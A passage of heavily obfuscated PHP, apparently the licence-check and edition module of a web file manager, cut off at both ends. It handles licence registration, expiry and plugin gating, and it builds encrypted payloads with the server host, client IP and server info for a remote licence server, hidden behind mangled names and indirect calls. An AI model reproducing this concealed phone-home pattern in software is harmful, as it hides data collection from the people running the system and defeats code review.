$«Í¶µÚ[70], $«Í¶µÚ[71], $«Í¶µÚ[72], $«Í¶µÚ[73], $«Í¶µÚ[74], $«Í¶µÚ[75], $«Í¶µÚ[76], $«Í¶µÚ[77], $«Í¶µÚ[78], $«Í¶µÚ[79], $«Í¶µÚ[80], $«Í¶µÚ[81], $«Í¶µÚ[82], $«Í¶µÚ[83], $«Í¶µÚ[84], $«Í¶µÚ[85]); foreach ($êİˆ¾Ã as $ëÁá§ÕÃ) { $üÀ³”ˆ = $GLOBALS[$«Í¶µÚ[86]][$«Í¶µÚ[87]][$ëÁá§ÕÃ]; $Ê¨®Œ­ = $şÛ—¤ÅË[706]; while (strlen($Ê¨®Œ­) < $şÛ—¤ÅË[683]) { if (!$Ê¨®Œ­) { break; } $Ê¨®Œ­++; } if (isset($Á…‡Ô³°[$ëÁá§ÕÃ])) { $üÀ³”ˆ = $Á…‡Ô³°[$ëÁá§ÕÃ]; } $‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[89]][$ëÁá§ÕÃ] = $üÀ³”ˆ; } $Æö´¦ˆ = $‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[89]][$«Í¶µÚ[46]]; unset($‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[90]][$«Í¶µÚ[91]]); $à³—¸À = $şÛ—¤ÅË[707]; if (strlen($à³—¸À) < $şÛ—¤ÅË[685]) { return; } unset($‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[90]][$«Í¶µÚ[92]]); $€ Ä±âÜ = $şÛ—¤ÅË[708]; if (!$€ Ä±âÜ) { die; } unset($‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[89]][$«Í¶µÚ[46]]); $¤Ç¡›Ö” = $şÛ—¤ÅË[709]; if (strlen($¤Ç¡›Ö”) < $şÛ—¤ÅË[695]) { return; } unset($‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[89]][$«Í¶µÚ[93]]); $›Ş¹©Ì = $şÛ—¤ÅË[710]; if (strlen($›Ş¹©Ì) < $şÛ—¤ÅË[687]) { return; } $‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[89]][$«Í¶µÚ[94]] = array($«Í¶µÚ[95] => (int) $Æö´¦ˆ[$«Í¶µÚ[96]], $«Í¶µÚ[97] => (int) _get($Æö´¦ˆ, $«Í¶µÚ[98], 0)); $×í½íµ = $şÛ—¤ÅË[711]; if (strlen($×í½íµ) < $şÛ—¤ÅË[683]) { return; } $õ¤Áá»ö = substr(md5($«Í¶µÚ[99] . get_client_ip() . $Á…‡Ô³°[$«Í¶µÚ[100]]), 0, 15); $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[102]] = Mcrypt::encode(Session::sign(), $õ¤Áá»ö, 3600 * 24); $óíï“·à = $şÛ—¤ÅË[712]; $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[103]] = Action($«Í¶µÚ[104])->accessToken(); $”™œ­Œ = $şÛ—¤ÅË[713]; if (!$”™œ­Œ) { return; } $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[105]] = md5($_SERVER[$«Í¶µÚ[106]] . $Á…‡Ô³°[$«Í¶µÚ[100]]); $Ï§Š¹èç = $şÛ—¤ÅË[714]; if (!$Ï§Š¹èç) { return; } $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[107]] = base64_encode(serverInfo()); $ÖÑñÙ²¤ = $şÛ—¤ÅË[715]; while ($ÖÑñÙ²¤ < $şÛ—¤ÅË[683]) { if ($ÖÑñÙ²¤ >= 0) { break; } $ÖÑñÙ²¤++; } $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[108]] = $this->motpbd1ebf01; $ú±™è€İ = $şÛ—¤ÅË[716]; if (strlen($ú±™è€İ) < $şÛ—¤ÅË[685]) { return; } if ($Á…‡Ô³°[$«Í¶µÚ[108]] != $«Í¶µÚ[109]) { $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[110]] = $Á…‡Ô³°[$«Í¶µÚ[110]]; $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[111]] = $Á…‡Ô³°[$«Í¶µÚ[111]]; $§Ëô½÷Ğ = rand_string(10) . $this->motpbd1ebf01 . rand_string(5); $‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[112]][$«Í¶µÚ[113]] = $this->vtphc8708edd($§Ëô½÷Ğ, $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[105]]); } if ($this->motpbd1ebf01 == $«Í¶µÚ[109]) { $‡Ù€ùÁ[$«Í¶µÚ[88]][$«Í¶µÚ[89]][$«Í¶µÚ[94]][$«Í¶µÚ[98]] = 0; } $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[114]] = $this->versionPluginFilter(); $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[115]] = _get($this->hlkdbb0cf943, $«Í¶µÚ[116], $«Í¶µÚ[6]); if (KodUser::isRoot() && $this->config[$«Í¶µÚ[117]]) { $‡Ù€ùÁ[$«Í¶µÚ[101]][$«Í¶µÚ[118]] = WEB_ROOT; } return $‡Ù€ùÁ; } private function budid0619abe() { $ÄûŞ‰ =& $_SERVER[Ş­ğŠìÒ]; $åØµê¿² =& $_SERVER[µ‡³ôÄƒ]; $Í²ù•š = $_SERVER[$åØµê¿²[24]] == $åØµê¿²[119]; if ($_SERVER[$åØµê¿²[24]] == $åØµê¿²[120] && $_GET[$åØµê¿²[121]] == $åØµê¿²[122]) { $Í²ù•š = !0; } if ($Í²ù•š) { $­…éûÈ = array($åØµê¿²[108] => $this->motpbd1ebf01, $åØµê¿²[123] => $this->bhsj5d453bc7(), $åØµê¿²[124] => Model($åØµê¿²[125])->count()); if ($this->motpbd1ebf01 != $åØµê¿²[109]) { $½Óï¸Ÿ = _get($this->hlkdbb0cf943, $åØµê¿²[126]); if ($½Óï¸Ÿ) { $­…éûÈ[$åØµê¿²[127]] = $½Óï¸Ÿ; $­…éûÈ[$åØµê¿²[128]] = strtotime(_get($this->hlkdbb0cf943, $åØµê¿²[129])); $­…éûÈ[$åØµê¿²[130]] = _get($this->hlkdbb0cf943, $åØµê¿²[116]); } $±í°¸• = Model($åØµê¿²[33])->get($åØµê¿²[131], $åØµê¿²[6], !0); if (is_string($±í°¸•) && substr($±í°¸•, 0, 1) == $åØµê¿²[132]) { $±í°¸• = json_decode_force($±í°¸•); } if (is_array($±í°¸•) && $±í°¸•[$åØµê¿²[133]] && strstr($±í°¸•[$åØµê¿²[133]], $åØµê¿²[134])) { $òÔÀ²š = explode($åØµê¿²[134], $±í°¸•[$åØµê¿²[133]]); $­…éûÈ[$åØµê¿²[135]] = $òÔÀ²š[0]; } } $­…éûÈ = $this->uxyof1bae123(json_encode($­…éûÈ), md5($åØµê¿²[136])); $ôÒÒÖ™€ = $ÄûŞ‰[717]; if (strlen($ôÒÒÖ™€) < $ÄûŞ‰[685]) { return; } $†‰Š·² = array($åØµê¿²[137] => $­…éûÈ); call_user_func(array($åØµê¿²[138], $åØµê¿²[139]), $†‰Š·²); } if ($this->motpbd1ebf01 == $åØµê¿²[109]) { return; } $Â–Ê¼Î¿ = array($åØµê¿²[140], $åØµê¿²[141], $åØµê¿²[142], $åØµê¿²[143], $åØµê¿²[144], $åØµê¿²[145]); $¨úï³Ï® = $ÄûŞ‰[718]; if (strlen($¨úï³Ï®) < $ÄûŞ‰[685]) { die; } $à€§×ô = Model($åØµê¿²[33])->get(); $†‰Š·² = array($åØµê¿²[146] => $à€§×ô[$åØµê¿²[34]], $åØµê¿²[147] => $à€§×ô[$åØµê¿²[35]], $åØµê¿²[148] => $åØµê¿²[6]); $ŸÊÏïÊî = $ÄûŞ‰[719]; while (strlen($ŸÊÏïÊî) < $ÄûŞ‰[683]) { if (!$ŸÊÏïÊî) { break; } $ŸÊÏïÊî++; } foreach ($Â–Ê¼Î¿ as $†äŸØó×) { if (!isset($à€§×ô[$†äŸØó×]) || !$à€§×ô[$†äŸØó×]) { continue; } $†‰Š·²[$†äŸØó×] = $à€§×ô[$†äŸØó×]; } call_user_func(array($åØµê¿²[138], $åØµê¿²[139]), $†‰Š·²); } private function xkli31e9fcde() { $ğäÃ²Ş =& $_SERVER[Ş­ğŠìÒ]; $ñÉßÇä‰ =& $_SERVER[µ‡³ôÄƒ]; if ($_SERVER[$ñÉßÇä‰[24]] != $ñÉßÇä‰[149]) { return; } if (!KodUser::isRoot()) { die; } $Àª´‘ú = $GLOBALS[$ñÉßÇä‰[13]]; if (isset($Àª´‘ú[$ñÉßÇä‰[150]])) { $this->jtwcfacb7b6e(); die; } if (isset($Àª´‘ú[$ñÉßÇä‰[151]]) && isset($Àª´‘ú[$ñÉßÇä‰[151]]) == $ñÉßÇä‰[122]) { $Àª´‘ú[$ñÉßÇä‰[152]] = Model($ñÉßÇä‰[33])->get($ñÉßÇä‰[153]); } if (!isset($Àª´‘ú[$ñÉßÇä‰[152]]) || strlen($Àª´‘ú[$ñÉßÇä‰[152]]) != 16) { show_json($ñÉßÇä‰[154] . $Àª´‘ú[$ñÉßÇä‰[152]], !1); } $³ŒãÅë = Model($ñÉßÇä‰[33])->get($ñÉßÇä‰[100]); $‘ì°÷‚¶ = md5($_SERVER[$ñÉßÇä‰[106]] . $³ŒãÅë); $áöÇ½Ì® = $ğäÃ²Ş[720]; $Óíà‚ó£ = array($ñÉßÇä‰[152] => $Àª´‘ú[$ñÉßÇä‰[152]], $ñÉßÇä‰[155] => rand_string(16), $ñÉßÇä‰[156] => $ñÉßÇä‰[136], $ñÉßÇä‰[157] => $ñÉßÇä‰[158], $ñÉßÇä‰[159] => $_SERVER[$ñÉßÇä‰[160]], $ñÉßÇä‰[161] => $_SERVER[$ñÉßÇä‰[162]], $ñÉßÇä‰[163] => $_SERVER[$ñÉßÇä‰[164]], $ñÉßÇä‰[105] => $‘ì°÷‚¶, $ñÉßÇä‰[165] => Model($ñÉßÇä‰[33])->get($ñÉßÇä‰[131])); if (isset($Àª´‘ú[$ñÉßÇä‰[151]]) && isset($Àª´‘ú[$ñÉßÇä‰[151]]) == $ñÉßÇä‰[122]) { $Óíà‚ó£[$ñÉßÇä‰[151]] = md5($Óíà‚ó£[$ñÉßÇä‰[152]] . $ñÉßÇä‰[166] . $Óíà‚ó£[$ñÉßÇä‰[155]]); } if ($Àª´‘ú[$ñÉßÇä‰[167]] == $ñÉßÇä‰[168]) { $æÄË½ãœ = $this->uxyof1bae123($‘ì°÷‚¶, $ñÉßÇä‰[169]); $İÙØÙ¨• = $this->vtphc8708edd(json_encode($Óíà‚ó£), $‘ì°÷‚¶ . $ñÉßÇä‰[170], 3); $İÙØÙ¨• = $İÙØÙ¨• . $ñÉßÇä‰[171] . $_SERVER[$ñÉßÇä‰[160]]; $’ï‘£ğè = $this->mswn1f63253c($ñÉßÇä‰[172] . $æÄË½ãœ . $ñÉßÇä‰[173] . $İÙØÙ¨•, -1); show_json($’ï‘£ğè, !0); } else { if ($Àª´‘ú[$ñÉßÇä‰[167]] == $ñÉßÇä‰[174]) { $˜Ù×²¨÷ = substr(md5($ñÉßÇä‰[175] . $‘ì°÷‚¶), 12, 15) . $ñÉßÇä‰[176]; $İÙØÙ¨• = $this->htxg88621058(trim($Àª´‘ú[$ñÉßÇä‰[177]]), $˜Ù×²¨÷, 2); $ŞºË¯Å‚ = json_decode($İÙØÙ¨•, !0); if (!is_array($ŞºË¯Å‚) || !is_array($ŞºË¯Å‚[$ñÉßÇä‰[178]]) || $ŞºË¯Å‚[$ñÉßÇä‰[152]] != !0) { $„¨ßú’­ = $ñÉßÇä‰[179]; $¢¨•Ö–€ = $ŞºË¯Å‚[$ñÉßÇä‰[178]] ? $ñÉßÇä‰[180] . $ŞºË¯Å‚[$ñÉßÇä‰[178]] : $„¨ßú’­; show_json($¢¨•Ö–€, !1); } else { $Óíà‚ó£[$ñÉßÇä‰[155]] = $ŞºË¯Å‚[$ñÉßÇä‰[178]][$ñÉßÇä‰[181]]; } } else { $ŞºË¯Å‚ = $this->mswn1f63253c($ñÉßÇä‰[182], $Óíà‚ó£, 10); $Éîô „ğ = $ğäÃ²Ş[721]; } } if (!is_array($ŞºË¯Å‚) || !is_array($ŞºË¯Å‚[$ñÉßÇä‰[178]]) || $ŞºË¯Å‚[$ñÉßÇä‰[152]] != !0) { $„¨ßú’­ = LNG($ñÉßÇä‰[183]); $¢¨•Ö–€ = $ŞºË¯Å‚[$ñÉßÇä‰[178]] ? $ñÉßÇä‰[180] . $ŞºË¯Å‚[$ñÉßÇä‰[178]] : $„¨ßú’­; show_json($¢¨•Ö–€, !1); } $ÇëêÓË = $ŞºË¯Å‚[$ñÉßÇä‰[178]]; $°Ó”å¥ş = $this->ceib05a6edcc($ÇëêÓË[$ñÉßÇä‰[184]]); $ùÆ‚üûŠ = $ğäÃ²Ş[722]; if (strlen($ùÆ‚üûŠ) < $ğäÃ²Ş[692]) { die; } if (!$°Ó”å¥ş || $°Ó”å¥ş != $ÇëêÓË[$ñÉßÇä‰[129]]) { $¯§üûø = array($ñÉßÇä‰[185] => Model($ñÉßÇä‰[33])->get($ñÉßÇä‰[100]), $ñÉßÇä‰[186] => $_SERVER[$ñÉßÇä‰[106]], $ñÉßÇä‰[187] => this_url(), $ñÉßÇä‰[161] => $_SERVER[$ñÉßÇä‰[162]]); $İÙØÙ¨• = $this->akos1ea96218(json_encode($¯§üûø)); $this->mswn1f63253c($ñÉßÇä‰[188] . $İÙØÙ¨•); show_json(LNG($ñÉßÇä‰[189]), !0); } $ˆ¦åôó‹ = array($ñÉßÇä‰[153] => $ÇëêÓË[$ñÉßÇä‰[190]], $ñÉßÇä‰[191] => $ÇëêÓË[$ñÉßÇä‰[192]], $ñÉßÇä‰[193] => rand_string(16), $ñÉßÇä‰[108] => $ÇëêÓË[$ñÉßÇä‰[194]]); if ($Óíà‚ó£[$ñÉßÇä‰[155]]) { $ˆ¦åôó‹[$ñÉßÇä‰[193]] = $Óíà‚ó£[$ñÉßÇä‰[155]]; } $¨‹÷çÒ± = substr(md5($ˆ¦åôó‹[$ñÉßÇä‰[191]]), 10, 10); $«³Åáá = $¨‹÷çÒ± . $ˆ¦åôó‹[$ñÉßÇä‰[108]] . $ˆ¦åôó‹[$ñÉßÇä‰[193]]; $ˆ¦åôó‹[$ñÉßÇä‰[110]] = strrev(base64_encode($this->uxyof1bae123($«³Åáá, $ñÉßÇä‰[195]))); $ı˜”ÊÇ = $ğäÃ²Ş[723]; $˜øı¹› = rand_string(16); $ı„·ş = $˜øı¹› . $ˆ¦åôó‹[$ñÉßÇä‰[108]] . $this->uxyof1bae123(md5($ˆ¦åôó‹[$ñÉßÇä‰[153]]), $˜øı¹›); $µ™‡½¯Ä = $ğäÃ²Ş[724]; if (!$µ™‡½¯Ä) { die; } $ˆ¦åôó‹[$ñÉßÇä‰[111]] = base64_encode(strrev($this->uxyof1bae123($ı„·ş, $ñÉßÇä‰[196]))); if ($ÇëêÓË[$ñÉßÇä‰[197]] && $ÇëêÓË[$ñÉßÇä‰[197]] >= 1) { Model($ñÉßÇä‰[33])->setDeep($ñÉßÇä‰[198], $ñÉßÇä‰[122]); } Model($ñÉßÇä‰[33])->set($ˆ¦åôó‹); $üçĞŠÔÒ = md5($_SERVER[$ñÉßÇä‰[106]] . strrev($³ŒãÅë) . $ˆ¦åôó‹[$ñÉßÇä‰[191]]); $È‚€·¶ = strrev(substr($üçĞŠÔÒ, 10, 16)); $²ê¨—Ù = $this->vtphc8708edd(json_encode($ÇëêÓË), $üçĞŠÔÒ); $ø„àÚÙ¾ = array_to_keyvalue(Model($ñÉßÇä‰[7])->listData(), $ñÉßÇä‰[199]); $ğ€åñº‰ = $ø„àÚÙ¾[$ñÉßÇä‰[200]]; $ËçÖı¯õ = array(); $·ÍˆúÂ³ = $ğäÃ²Ş[725]; $ËçÖı¯õ[$È‚€·¶] = $²ê¨—Ù; $¸øî¶üı = $ğäÃ²Ş[726]; if (!$¸øî¶üı) { return; } Model($ñÉßÇä‰[7])->update($ğ€åñº‰[$ñÉßÇä‰[201]], array($ñÉßÇä‰[202] => $ËçÖı¯õ)); $this->hlkdbb0cf943 = $ÇëêÓË; $¬áÈŒ¬ = $ğäÃ²Ş[727]; if (strlen($¬áÈŒ¬) < $ğäÃ²Ş[685]) { die; } $this->motpbd1ebf01 = $ˆ¦åôó‹[$ñÉßÇä‰[108]]; $€¹ô¤›± = $ğäÃ²Ş[728]; if (!$€¹ô¤›±) { die; } $this->licenseRegistSuccess(); $ÕªÌªÆû = $ğäÃ²Ş[729]; if (!$ÕªÌªÆû) { die; } Cache::set($ñÉßÇä‰[203] . md5($³ŒãÅë . $ñÉßÇä‰[204]), $ñÉßÇä‰[6]); $™½İ»íâ = $ğäÃ²Ş[730]; if (strlen($™½İ»íâ) < $ğäÃ²Ş[687]) { return; } show_json(LNG($ñÉßÇä‰[189]), !0); } private function licenseRegistSuccess() { $Í—ĞÄâë =& $_SERVER[µ‡³ôÄƒ]; $®ëÑ‹‡æ = Model($Í—ĞÄâë[33])->get(); if ($®ëÑ‹‡æ[$Í—ĞÄâë[63]] != $Í—ĞÄâë[122]) { Model($Í—ĞÄâë[33])->set($Í—ĞÄâë[63], $Í—ĞÄâë[122]); } Action($Í—ĞÄâë[205])->initStart(!0); } private function jtwcfacb7b6e() { $è¦¡ä×Ó =& $_SERVER[Ş­ğŠìÒ]; $íÅ“²õ =& $_SERVER[µ‡³ôÄƒ]; Model($íÅ“²õ[33])->set(array($íÅ“²õ[153] => $íÅ“²õ[6], $íÅ“²õ[191] => $íÅ“²õ[6], $íÅ“²õ[108] => $íÅ“²õ[109], $íÅ“²õ[110] => $íÅ“²õ[6], $íÅ“²õ[111] => $íÅ“²õ[6])); $¥•¢–™’ = $è¦¡ä×Ó[731]; while (strlen($¥•¢–™’) < $è¦¡ä×Ó[685]) { if (!$¥•¢–™’) { break; } $¥•¢–™’++; } Model($íÅ“²õ[33])->setDeep($íÅ“²õ[198], $íÅ“²õ[206]); $‡÷şÎ† = $è¦¡ä×Ó[732]; while ($‡÷şÎ† < $è¦¡ä×Ó[683]) { if ($‡÷şÎ† >= 0) { break; } $‡÷şÎ†++; } $this->hlkdbb0cf943 = array(); $this->motpbd1ebf01 = $íÅ“²õ[109]; } private function odgle4402e0d() { $ÄêÀ”Õ‰ =& $_SERVER[Ş­ğŠìÒ]; $·ĞûÓŠİ =& $_SERVER[µ‡³ôÄƒ]; $_SERVER[$·ĞûÓŠİ[162]] = _get($_SERVER, $·ĞûÓŠİ[162], APP_HOST); $Øèò’® = $ÄêÀ”Õ‰[733]; if (!$Øèò’®) { return; } $this->motpbd1ebf01 = $·ĞûÓŠİ[109]; $õ¤èÖ–Ù = $ÄêÀ”Õ‰[734]; if (!$õ¤èÖ–Ù) { return; } $Ÿ²±“íæ = Model($·ĞûÓŠİ[33])->get(); if ($Ÿ²±“íæ[$·ĞûÓŠİ[108]] == $·ĞûÓŠİ[109]) { return; } $ºÒ×¬¼ú = Model($·ĞûÓŠİ[33])->get($·ĞûÓŠİ[100]); $æÉ’ä¬ó = $ÄêÀ”Õ‰[689]; $êéÛ¨‘ = $·ĞûÓŠİ[203] . md5($ºÒ×¬¼ú . $·ĞûÓŠİ[204]); $‰ÕšÙİ¼ = $ÄêÀ”Õ‰[735]; while (strlen($‰ÕšÙİ¼) < $ÄêÀ”Õ‰[692]) { if (!$‰ÕšÙİ¼) { break; } $‰ÕšÙİ¼++; } $ù¶å‹ñŸ = Cache::get($êéÛ¨‘); if (!is_array($ù¶å‹ñŸ) || !isset($ù¶å‹ñŸ[$·ĞûÓŠİ[207]]) || time() - $ù¶å‹ñŸ[$·ĞûÓŠİ[207]] >= 60) { $èêäç±Í = Model($·ĞûÓŠİ[7])->loadList(); $ÒĞÓ¹£ò = $èêäç±Í[$·ĞûÓŠİ[200]]; $ãÛåÀŠ® = md5($_SERVER[$·ĞûÓŠİ[106]] . strrev($ºÒ×¬¼ú) . $Ÿ²±“íæ[$·ĞûÓŠİ[191]]); $ŸÙâ×ş = strrev(substr($ãÛåÀŠ®, 10, 16)); $ù¶å‹ñŸ = $this->htxg88621058($ÒĞÓ¹£ò[$·ĞûÓŠİ[86]][$ŸÙâ×ş], $ãÛåÀŠ®); $ù¶å‹ñŸ = json_decode($ù¶å‹ñŸ, !0); } if (!is_array($ù¶å‹ñŸ)) { return $this->jtwcfacb7b6e(); } $Ú½£Âá = strtotime($ù¶å‹ñŸ[$·ĞûÓŠİ[129]]); if (time() >= $Ú½£Âá) { return $this->jtwcfacb7b6e(); } if (!isset($ù¶å‹ñŸ[$·ĞûÓŠİ[207]]) || time() - $ù¶å‹ñŸ[$·ĞûÓŠİ[207]] > 20) { $ù¶å‹ñŸ[$·ĞûÓŠİ[207]] = time(); Cache::set($êéÛ¨‘, $ù¶å‹ñŸ); } $this->hlkdbb0cf943 = $ù¶å‹ñŸ; $this->motpbd1ebf01 = $Ÿ²±“íæ[$·ĞûÓŠİ[108]]; $‰¤ßĞ€Ö = $ÄêÀ”Õ‰[736]; if (strlen($‰¤ßĞ€Ö) < $ÄêÀ”Õ‰[685]) { die; } } private function qsrwa5707b63() { $§ûÍ­­‡ =& $_SERVER[µ‡³ôÄƒ]; $¸˜Šß›µ = $GLOBALS[$§ûÍ­­‡[13]]; $ˆ¡ª àˆ = $_SERVER[$§ûÍ­­‡[24]]; $ĞºĞ•‹¸ = $_SERVER[Ş­ğŠìÒ][737]; if ($ˆ¡ª àˆ == $§ûÍ­­‡[208] && $this->motpbd1ebf01 == $§ûÍ­­‡[109]) { show_json(LNG($§ûÍ­­‡[209]), !1, $§ûÍ­­‡[210]); } $óªãòª˜ = array($§ûÍ­­‡[211], $§ûÍ­­‡[212]); if (in_array($ˆ¡ª àˆ, $óªãòª˜)) { if ($this->motpbd1ebf01 == $§ûÍ­­‡[109] && isset($¸˜Šß›µ[$§ûÍ­­‡[213]])) { show_json(LNG($§ûÍ­­‡[209]), !1, $§ûÍ­­‡[210]); die; } $Û¡Ê‚‡µ = $this->bhsj5d453bc7(); if ($Û¡Ê‚‡µ != intval($§ûÍ­­‡[214])) { if ($Û¡Ê‚‡µ <= Model($§ûÍ­­‡[125])->count()) { show_json(LNG($§ûÍ­­‡[215]), !1, $§ûÍ­­‡[210]); die; } } } } private function obutaabbc77d() { $ııú©å =& $_SERVER[Ş­ğŠìÒ]; $Ú“½Î÷ó =& $_SERVER[µ‡³ôÄƒ]; $›¥§¥ìŞ = array($Ú“½Î÷ó[119], $Ú“½Î÷ó[120]); if (!KodUser::isRoot() || !isset($_GET[$Ú“½Î÷ó[216]])) { return; } if (!in_array($_SERVER[$Ú“½Î÷ó[24]], $›¥§¥ìŞ)) { return; } $Â›µ­íŒ = $Ú“½Î÷ó[217]; $§Ş‡¶¡ = $ııú©å[738]; $Â›µ­íŒ = $this->tsnkac1c29d9($Â›µ­íŒ, $Ú“½Î÷ó[218]); $Ç†ÌÑïç = $ııú©å[739]; while (strlen($Ç†ÌÑïç) < $ııú©å[695]) { if (!$Ç†ÌÑïç) { break; } $Ç†ÌÑïç++; } $û±µıÕ† = stream_context_create(array($Ú“½Î÷ó[219] => array($Ú“½Î÷ó[220] => $Ú“½Î÷ó[221], $Ú“½Î÷ó[222] => 3))); $ÚÄ Ï = @file_get_contents($Â›µ­íŒ, !1, $û±µıÕ†); $Ô‰Û¥‚® = $ııú©å[740]; header($Ú“½Î÷ó[223]); if ($ÚÄ Ï && strstr($ÚÄ Ï, $Ú“½Î÷ó[224])) { echo $ÚÄ Ï; } die; } public function ziqj08c7571e($ÛÊµêÁ±) { $Ôû»ù =& $_SERVER[Ş­ğŠìÒ]; $Á„©¢è =& $_SERVER[µ‡³ôÄƒ]; if ($this->motpbd1ebf01 == $Á„©¢è[225]) { return $ÛÊµêÁ±; } $Ğ§ÆÕÇ = $this->versionPluginList(); $±Ò¥—¥ = explode($Á„©¢è[226], $this->versionPluginFilter()); $ƒµòÄıÊ = array(); foreach ($Ğ§ÆÕÇ as $¦›“ùúä => $»¹¤¼¹Ã) { if ($»¹¤¼¹Ã == $Á„©¢è[227] && substr($this->motpbd1ebf01, 0, 1) == $Á„©¢è[227]) { continue; } if (!in_array($¦›“ùúä, $±Ò¥—¥)) { $ƒµòÄıÊ[] = $¦›“ùúä; } } foreach ($ƒµòÄıÊ as $¦›“ùúä) { unset($ÛÊµêÁ±[$¦›“ùúä]); $Ìƒæ¿Ç« = $Ôû»ù[741]; if (!$Ìƒæ¿Ç«) { return; } } return $ÛÊµêÁ±; $Ì”úà­ = $Ôû»ù[742]; if (strlen($Ì”úà­) < $Ôû»ù[687]) { return; } } private function versionPluginList() { $¤›Î¢˜¥ =& $_SERVER[µ‡³ôÄƒ]; return array($¤›Î¢˜¥[228] => $¤›Î¢˜¥[227], $¤›Î¢˜¥[229] => $¤›Î¢˜¥[227], $¤›Î¢˜¥[230] => $¤›Î¢˜¥[227], $¤›Î¢˜¥[231] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[233] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[234] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[235] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[236] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[237] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[238] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[239] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[240] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[241] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[242] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[243] => $¤›Î¢˜¥[232], $¤›Î¢˜¥[244] => $¤›Î¢˜¥[232]); $¨›õû™ë = $_SERVER[Ş­ğŠìÒ][743]; } private function versionPluginFilter() { $ªØ—íüç =& $_SERVER[µ‡³ôÄƒ]; if ($this->motpbd1ebf01 == $ªØ—íüç[109]) { return $ªØ—íüç[6]; } $ªŸÛ”®š = _get($this->hlkdbb0cf943, $ªØ—íüç[245], $ªØ—íüç[6]); $úã¤¬ı = _get($this->hlkdbb0cf943, $ªØ—íüç[116], $ªØ—íüç[6]); $ÃÑæÂëé = _get($this->hlkdbb0cf943, $ªØ—íüç[246], $ªØ—íüç[6]); $¼íœ“â™ = $_SERVER[Ş­ğŠìÒ][744]; if (!$¼íœ“â™) { return; } if ($úã¤¬ı > time() && $ÃÑæÂëé > time()) { $åÆ‡¤µ = explode($ªØ—íüç[226], $ªŸÛ”®š); $ÇÂšœğ = array_keys($this->versionPluginList()); $ªŸÛ”®š = array_merge($åÆ‡¤µ, $ÇÂšœğ); $ªŸÛ”®š = implode($ªØ—íüç[226], array_filter(array_unique($ªŸÛ”®š))); } return $ªŸÛ”®š; } private function pjzfc24610e6() { $óºööœğ =& $_SERVER[µ‡³ôÄƒ]; if ($this->motpbd1ebf01 != $óºööœğ[109]) { $GLOBALS[$óºööœğ[86]][$óºööœğ[90]][$óºööœğ[247]] = $óºööœğ[206]; return; } $GLOBALS[$óºööœğ[86]][$óºööœğ[248]] = $óºööœğ[122]; if (Model($óºööœğ[249])->get($óºööœğ[63]) != $óºööœğ[206]) { Model($óºööœğ[249])->set($óºööœğ[63], $óºööœğ[206]); } } public function ezpgaddb1ac6() { $æöÓ‚Ÿ =& $_SERVER[Ş­ğŠìÒ]; return $_SERVER[µ‡³ôÄƒ][250]; $¸ÙÜ…£ = $æöÓ‚Ÿ[745]; if (strlen($¸ÙÜ…£) < $æöÓ‚Ÿ[695]) { die; } } private function gtihf7c07719() { $¡ùÅéç» =& $_SERVER[Ş­ğŠìÒ]; $ƒ™‹àÒù =& $_SERVER[µ‡³ôÄƒ]; $—˜åóØí = array($ƒ™‹àÒù[251], $ƒ™‹àÒù[252], $ƒ™‹àÒù[253]); $ùŒü¾ıŒ = $ƒ™‹àÒù[254] . md5($ƒ™‹àÒù[255]); $Ì·ÁÇ®Ê = $¡ùÅéç»[746]; if (strlen($Ì·ÁÇ®Ê) < $¡ùÅéç»[685]) { die; } if ($this->motpbd1ebf01 == $ƒ™‹àÒù[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ƒ™‹àÒù[24]], $—˜åóØí)) { return; } if (time() % 4 != 0) { return; } $ ®Š«ü¬ = call_user_func(array($ƒ™‹àÒù[256], $ƒ™‹àÒù[257]), $ùŒü¾ıŒ); $°ÇÇÙıª = $¡ùÅéç»[747]; while ($°ÇÇÙıª < $¡ùÅéç»[692]) { if ($°ÇÇÙıª >= 0) { break; } $°ÇÇÙıª++; } if ($ ®Š«ü¬ && time() - $ ®Š«ü¬ < intval($ƒ™‹àÒù[258])) { return; } call_user_func(array($ƒ™‹àÒù[256], $ƒ™‹àÒù[139]), $ùŒü¾ıŒ, time()); $„ñ²şàË = $¡ùÅéç»[748]; if (strlen($„ñ²şàË) < $¡ùÅéç»[685]) { die; } $Š²ğÎ·ş = Model($ƒ™‹àÒù[33])->get($ƒ™‹àÒù[100]); $Ò‰ÁÅ· = $¡ùÅéç»[749]; while ($Ò‰ÁÅ· < $¡ùÅéç»[695]) { if ($Ò‰ÁÅ· >= 0) { break; } $Ò‰ÁÅ·++; } $—É‹ñ¯ = array($ƒ™‹àÒù[152] => Model($ƒ™‹àÒù[33])->get($ƒ™‹àÒù[153]), $ƒ™‹àÒù[167] => $this->motpbd1ebf01, $ƒ™‹àÒù[163] => $_SERVER[$ƒ™‹àÒù[164]], $ƒ™‹àÒù[165] => 